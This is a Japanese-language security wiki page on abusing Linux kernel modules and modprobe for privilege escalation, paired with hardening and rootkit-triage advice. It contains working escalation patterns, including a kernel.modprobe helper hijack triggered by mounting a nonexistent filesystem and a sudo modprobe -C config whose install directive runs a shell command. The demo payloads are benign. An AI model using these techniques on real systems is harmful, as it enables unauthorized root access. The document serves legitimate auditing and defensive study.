# Kernel Modules と modprobe の悪用

{{#include ../../banners/hacktricks-training.md}}

## Kernel module と module-loading の設定ミス

Kernel module のサポートは、Linux の privilege escalation の調査において影響の大きい領域です。unsigned-module のメッセージだけで悪用可能と判断せず、実際的な疑問の解決に役立ててください。<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[8]](#references)[[9]](#references)[[10]](#references)</sup>

- 現在のユーザーは、`sudo`、capabilities、または書き込み可能な helper path を通じて module をロードできますか？
- module のロードは引き続き有効ですか？
- module signature enforcement は無効ですか？
- module ディレクトリ、module ファイル、または `modprobe.d` の設定 path は書き込み可能ですか？<sup>[[16]](#references)</sup>
- 何が起きたかを確認するために、kernel log を読み取れますか？

最初の簡易調査では、次の module の状態、署名、ログ、および module ツリーのチェックを行います。<sup>[[1]](#references)[[2]](#references)[[6]](#references)[[8]](#references)</sup>

```bash
uname -a
uname -r
cat /proc/sys/kernel/modules_disabled 2>/dev/null
grep -Eo '(^| )module\.sig_enforce(=[^ ]*)?' /proc/cmdline 2>/dev/null
grep -E '^(CONFIG_STATIC_USERMODEHELPER|CONFIG_STATIC_USERMODEHELPER_PATH)=' "/boot/config-$(uname -r)" 2>/dev/null
grep -E '^(CONFIG_MODULE_SIG|CONFIG_MODULE_SIG_FORCE)=' "/boot/config-$(uname -r)" 2>/dev/null
cat /proc/sys/kernel/dmesg_restrict 2>/dev/null
dmesg 2>/dev/null | grep -Ei 'module|signature|taint|verification'
find /lib/modules/$(uname -r) -type d -writable -ls 2>/dev/null
find /lib/modules/$(uname -r) -type f -name '*.ko*' -writable -ls 2>/dev/null
```

解釈:

- `modules_disabled=1` は、モジュールのロードもアンロードもできず、再起動するまで値を `0` に戻せないことを意味します。<sup>[[1]](#references)</sup>
- kernel command line の `module.sig_enforce=1` または `CONFIG_MODULE_SIG_FORCE=y` が設定されている場合、有効な署名が付いたモジュールが必要です。そうでない場合、署名されていないモジュールがロードされ、kernel に taint が付く可能性があります。<sup>[[2]](#references)</sup>
- `dmesg_restrict=0` では `dmesg` に制限はありません。値が `1` の場合、アクセスには `CAP_SYSLOG` が必要です。<sup>[[1]](#references)</sup>
- `/lib/modules/$(uname -r)/` 配下の書き込み可能なパスは危険です。`modprobe` はモジュールのロード時に、このツリーと依存関係データを検索するためです。<sup>[[8]](#references)</sup>

### モジュールのロードと kernel 出力の読み取り

ローカルモジュールをロードする正当な権限がある場合、`insmod` は指定した `.ko` ファイルをそのまま挿入します。ロードの一部としてモジュールの init 関数が実行され、`printk()` で書き込まれたメッセージは kernel log buffer に送られます。通常は `dmesg` で読み取ります。<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)</sup>

基本的な確認手順では、`modinfo` でメタデータを調べ、`insmod` と `rmmod` でモジュールをロードおよび削除し、`lsmod` でロード状態を確認して、`dmesg` で kernel log を調べます。<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
ls -l ./example.ko
modinfo ./example.ko 2>/dev/null
sudo insmod ./example.ko
lsmod | grep -i example
dmesg | tail -n 30
sudo rmmod example
dmesg | tail -n 30
```

`sudo -l`で`insmod`、`modprobe`、またはそれらをラップするコマンドが許可されている場合は、重大な問題として扱ってください。`sudo -l`は、コマンドを実行するユーザーの権限を表示します。カーネルモジュールのロードには`CAP_SYS_MODULE`が必要です。直接的なcapabilityベースの経路については、[Linux capabilities](../interesting-files-permissions/linux-capabilities.md#cap_sys_module)を参照してください。<sup>[[3]](#references)[[9]](#references)[[10]](#references)</sup>

```bash
sudo -l
sudo /sbin/insmod ./example.ko
```

### `insmod` の sudo 許可

ユーザーに `insmod` の実行を許可する sudo ルールは、通常の管理用ヘルパーの実行を許可する場合とは同等ではありません。モジュールの初期化コードは挿入時に実行されるため、実際に確認すべきなのは、このユーザーがロードするモジュールを選択または変更できるかどうかです。<sup>[[3]](#references)</sup>

以下の一般的な確認フローでは、候補モジュールについて、検査、ロード、状態、ログ、および削除の確認を繰り返します。<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
sudo -l
ls -l ./candidate.ko
modinfo ./candidate.ko 2>/dev/null
sudo /sbin/insmod ./candidate.ko
lsmod | grep -i candidate
dmesg | tail -n 30
sudo /sbin/rmmod candidate
```

ユーザーが任意の `.ko` を提供できる場合、許可された評価では、このルールはシステム全体の完全な侵害につながるものとして扱うべきです。より安全な運用方法は、sudo を通じたモジュールのロードを委任しないことです。避けられない場合は、正確なパス、所有者、権限、署名ポリシー、および削除手順を制限してください。<sup>[[3]](#references)[[10]](#references)</sup>

管理されたラボで無害なモジュール構築パターンを試す場合は、最小限のソースと Makefile を以下に示します。`make -C /lib/modules/$(uname -r)/build M=$PWD` 形式は、外部モジュール向けのカーネル公式 kbuild ワークフローに従っています。<sup>[[5]](#references)[[7]](#references)</sup>

```c
#include <linux/module.h>
#include <linux/kernel.h>

static int __init demo_init(void) {
    printk(KERN_INFO "demo module loaded\n");
    return 0;
}

static void __exit demo_exit(void) {
    printk(KERN_INFO "demo module unloaded\n");
}

module_init(demo_init);
module_exit(demo_exit);
MODULE_LICENSE("GPL");
```

```makefile
obj-m += demo.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

認可されたラボ内でのみビルドおよびロードしてください。kbuild は外部モジュールをビルドし、ロード／削除コマンドはカーネルモジュールインターフェースを呼び出します。<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[7]](#references)</sup>

```bash
make
sudo insmod demo.ko
dmesg | tail -n 20
sudo rmmod demo
```

### `kernel.modprobe` / `modprobe_path` の悪用チェック

`kernel.modprobe` は、モジュールの自動ロード要求時にカーネルが実行する userspace helper を指定します。この sysctl が影響するのは自動ロードであり、明示的なモジュール挿入ではありません。攻撃者がこの値を、書き込み可能な実行ファイルのパスに変更し、モジュール要求を発生させられる場合、その helper は特権でのコード実行経路になります。空文字列に設定すると自動ロード要求が無効になります。`CONFIG_STATIC_USERMODEHELPER=y` の場合、空でない値はコンパイル時に組み込まれた static helper のパスで上書きされます。<sup>[[1]](#references)</sup>

カーネルの sysctl インターフェースから現在の helper パスを確認し、対象の所有者とモードを調べます。<sup>[[1]](#references)</sup>

```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
sysctl kernel.modprobe 2>/dev/null
ls -l "$(cat /proc/sys/kernel/modprobe 2>/dev/null)" 2>/dev/null
```

sysctl、委任された sudo ルール、または file capabilities に影響を及ぼせるか確認します。<sup>[[1]](#references)[[9]](#references)[[10]](#references)[[15]](#references)</sup>

```bash
ls -l /proc/sys/kernel/modprobe
sudo -l | grep -E 'sysctl|tee|bash|sh|modprobe'
getcap -r / 2>/dev/null | grep -E 'cap_sys_admin|cap_sys_module'
```

次のラボ専用パターンは helper のパスを変更し、文書化されている module-autoload request を発生させます。隔離された許可済みシステムでのみ使用してください。<sup>[[1]](#references)</sup>

現在の Linux kernel では、汎用的なトリガーとして未知の実行ファイルを使用しないでください。従来のカスタム binary-format による module autoloading は Linux 6.14 で削除されており、kernel のドキュメントでは未知の filesystem type が module-autoload request の発生経路として示されています。<sup>[[1]](#references)[[11]](#references)</sup>

```bash
# Example only: requires permission to write kernel.modprobe
printf '#!/bin/sh\nid > /tmp/modprobe-helper-ran\n' > /tmp/helper
chmod +x /tmp/helper
echo /tmp/helper | sudo tee /proc/sys/kernel/modprobe

# Trigger a documented module-autoload request (requires mount privilege)
sudo mount -t definitely-not-a-filesystem none /mnt 2>/dev/null || true
cat /tmp/modprobe-helper-ran 2>/dev/null
```

強化されたシステムでは、権限によって非特権ユーザーによる `kernel.modprobe` への書き込みが禁止されている場合、helper path が書き込み不可の場合、またはモジュールの自動ロードが無効になっている場合、この処理は失敗するはずです。<sup>[[1]](#references)</sup>

### 書き込み可能な `modprobe.d` 設定と `sudo modprobe -C`

モジュールを解決する前に、`modprobe` は優先順位に従って、`/etc/modprobe.d`、`/run/modprobe.d`、`/usr/local/lib/modprobe.d`、`/usr/lib/modprobe.d`、`/lib/modprobe.d` などの設定ディレクトリから `.conf` ファイルを読み込みます。優先順位の高いディレクトリに同名のファイルがあると、優先順位の低いディレクトリにあるファイルは隠されます。さらに重要なのは、`install <module> <command>` ディレクティブにより、そのモジュールを挿入する**代わりに**任意のシェルコマンドが実行されることです。したがって、書き込み可能な設定パスは、後から特権を持つ `modprobe` 呼び出し元の資格情報でコマンドを遅延実行する手段になり得ます。カーネルモジュール署名の強制は、このユーザー空間のコマンドを認証しません。<sup>[[16]](#references)</sup>

ディレクトリとファイルの権限を監査し、有効な設定を確認してください。`modprobe -n -v` は、dry-run モードではモジュールを挿入せず、`install`/`remove` コマンドも実行しないため、安全に解決結果を確認できます。現在の kmod ドキュメントで kmod 36 以降に削除予定とされている旧式の `--showconfig` 表記ではなく、`modprobe -c` を使用してください。<sup>[[8]](#references)[[16]](#references)</sup>

```bash
for d in /etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d /usr/lib/modprobe.d /lib/modprobe.d; do
    [ -e "$d" ] || continue
    find "$d" -maxdepth 1 -writable -ls 2>/dev/null
done

grep -RHE '^[[:space:]]*(install|remove|alias|blacklist)[[:space:]]' \
  /etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d \
  /usr/lib/modprobe.d /lib/modprobe.d 2>/dev/null
modprobe -c 2>/dev/null | grep -E '^(install|remove|alias|blacklist)[[:space:]]'
modprobe -n -v <module_name>
```

`modprobe` に対する制限のない sudo ルールは、任意の `.ko` ファイルが署名検証を通過できない場合でも悪用できます。`-C` で攻撃者が制御する設定ディレクトリを指定でき、そこから sudo で起動されたプロセスに `install` コマンドを実行させられます。<sup>[[8]](#references)[[16]](#references)</sup>

```bash
# Authorized lab proof for an unrestricted `sudo modprobe` rule
D="$(mktemp -d)"
printf '%s\n' 'install ht_probe /bin/sh -c "id > /tmp/ht-modprobe-id"' > "$D/00-ht.conf"
sudo /sbin/modprobe -C "$D" ht_probe
cat /tmp/ht-modprobe-id
```

緩和策として、sudo 経由で引数制限なしの `modprobe` を許可せず、すべての設定ディレクトリを root 所有かつ書き込み不可にし、予期しない `install`/`remove` ディレクティブを確認してください。信頼できる管理ワークフローで、あるモジュールについてこうしたディレクティブを回避する必要がある場合、`modprobe --ignore-install` は指定したモジュールのディレクティブを無視しますが、依存モジュールには独自のコマンドが設定されている可能性があります。<sup>[[8]](#references)[[16]](#references)</sup>

### 書き込み可能な `/lib/modules` の確認

書き込み可能なモジュールディレクトリは、`modprobe` の後続の実行方法によっては、モジュールの置き換え、悪意のあるモジュールの配置、自動ロードの悪用につながる可能性があります。`modprobe` は `/lib/modules/$(uname -r)` を検索し、モジュール解決時に依存関係データを使用します。<sup>[[8]](#references)</sup>

アクティブなカーネルリリースのモジュールツリー内にある、書き込み可能なモジュールファイルと依存関係／エイリアスのメタデータを確認してください。<sup>[[8]](#references)</sup>

```bash
KREL="$(uname -r)"
find "/lib/modules/$KREL" -type d -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f -name '*.ko*' -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f \( -name 'modules.dep' -o -name 'modules.alias' -o -name 'modules.order' \) -writable -ls 2>/dev/null
```

書き込み可能なモジュールの内容が見つかった場合は、`modprobe` が依存関係をどのように解決するか、また `modinfo` がモジュールのメタデータをどのように表示するかを確認します。<sup>[[8]](#references)[[12]](#references)</sup>

```bash
modprobe --show-depends <module_name> 2>/dev/null
modinfo <module_name> 2>/dev/null
grep -R "<module_name>" /lib/modules/$(uname -r)/modules.* 2>/dev/null
```

防御上の注意:

- `/lib/modules` の所有者を `root:root` にし、ユーザーが書き込めないようにします。<sup>[[8]](#references)</sup>
- 運用上可能な場合は、起動後に `kernel.modules_disabled=1` を設定します。<sup>[[1]](#references)</sup>
- loadable modules が必要なシステムでは、module signing を強制します。<sup>[[2]](#references)</sup>
- `/proc/sys/kernel/modprobe`、`/lib/modules`、`modprobe.d` の設定ディレクトリへの書き込みに加え、予期しない `insmod`/`modprobe` の実行を監視します。<sup>[[1]](#references)[[8]](#references)[[16]](#references)</sup>



## モジュールベースのrootkitトリアージ

悪意のあるモジュールは、syscall、VFS、`/proc` の表示、ネットワーク経路、または認証情報チェックにフックを仕掛け、プロセスやファイルを隠したり、トラフィックをリダイレクトしたり、秘密情報を傍受したりできます。また、`lsmod` が表示するモジュール一覧から自身を削除することもできます。永続化には、`modprobe.d` の alias や install ルール、`/etc/modules-load.d`、systemd unit、initramfs の内容、または正規の `.ko` ファイルの置き換えが使われることがあります。通常の `lsmod` の結果は有用な証拠ですが、カーネルレベルで侵害されている場合、カーネルが提供する一覧の信頼性が損なわれる可能性があります。ロード済みモジュール、ディスク上のファイル、起動設定、モジュール読み込みログ、信頼できる外部テレメトリを相互に照合してください。

```bash
cat /proc/modules
lsmod
find /lib/modules/"$(uname -r)" -type f -name '*.ko*' -ls 2>/dev/null
grep -R -nE '^(install|softdep|blacklist|options) ' /etc/modprobe.d /run/modprobe.d /usr/lib/modprobe.d 2>/dev/null
find /etc/modules-load.d /usr/lib/modules-load.d -maxdepth 1 -type f -print 2>/dev/null
journalctl -k -b | grep -Ei 'module|taint|signature|lockdown'
cat /proc/sys/kernel/tainted
```

不審なモジュール名、パス、依存関係、署名、ロード時刻を確認してください。Kernel taint や unsigned module のメッセージは手掛かりにはなりますが、rootkit の証拠ではありません。rootkit が疑われる場合は、稼働中の kernel の出力に頼る前に、信頼できるイメージまたはリカバリー環境から証拠を収集してください。[kernel vulnerability assessment](kernel-vulnerability-assessment.md) ページでは、tracefs や pinned BPF objects を含む設定と診断情報の露出について説明しています。

## References

- [1] [/proc/sys/kernel/ のドキュメント — Linux Kernel のドキュメント](https://docs.kernel.org/admin-guide/sysctl/kernel.html)
- [2] [Kernel module signing facility — Linux Kernel のドキュメント](https://www.kernel.org/doc/html/latest/admin-guide/module-signing.html)
- [3] [init_module(2) — Linux マニュアルページ](https://man7.org/linux/man-pages/man2/init_module.2.html)
- [4] [insmod(8) — Linux マニュアルページ](https://man7.org/linux/man-pages/man8/insmod.8.html)
- [5] [Driver Basics — Linux Kernel のドキュメント](https://docs.kernel.org/driver-api/basics.html)
- [6] [printk によるメッセージのログ記録 — Linux Kernel のドキュメント](https://docs.kernel.org/core-api/printk-basics.html)
- [7] [外部モジュールのビルド — Linux Kernel のドキュメント](https://docs.kernel.org/kbuild/modules.html)
- [8] [modprobe(8) — Linux マニュアルページ](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [9] [sudo(8) — Linux マニュアルページ](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [10] [capabilities(7) — Linux マニュアルページ](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [11] [タグ「execve-v6.14-rc1」をマージ — torvalds/linux](https://github.com/torvalds/linux/commit/fadc3ed9ce1cd9ecc5c8be8875f7ec11ab3a7ebe)
- [12] [modinfo(8) — Linux マニュアルページ](https://man7.org/linux/man-pages/man8/modinfo.8.html)
- [13] [lsmod(8) — Linux マニュアルページ](https://man7.org/linux/man-pages/man8/lsmod.8.html)
- [14] [rmmod(8) — Linux マニュアルページ](https://man7.org/linux/man-pages/man8/rmmod.8.html)
- [15] [getcap(8) — Linux マニュアルページ](https://man7.org/linux/man-pages/man8/getcap.8.html)
- [16] [modprobe.d(5) — Linux マニュアルページ](https://man7.org/linux/man-pages/man5/modprobe.d.5.html)
{{#include ../../banners/hacktricks-training.md}}
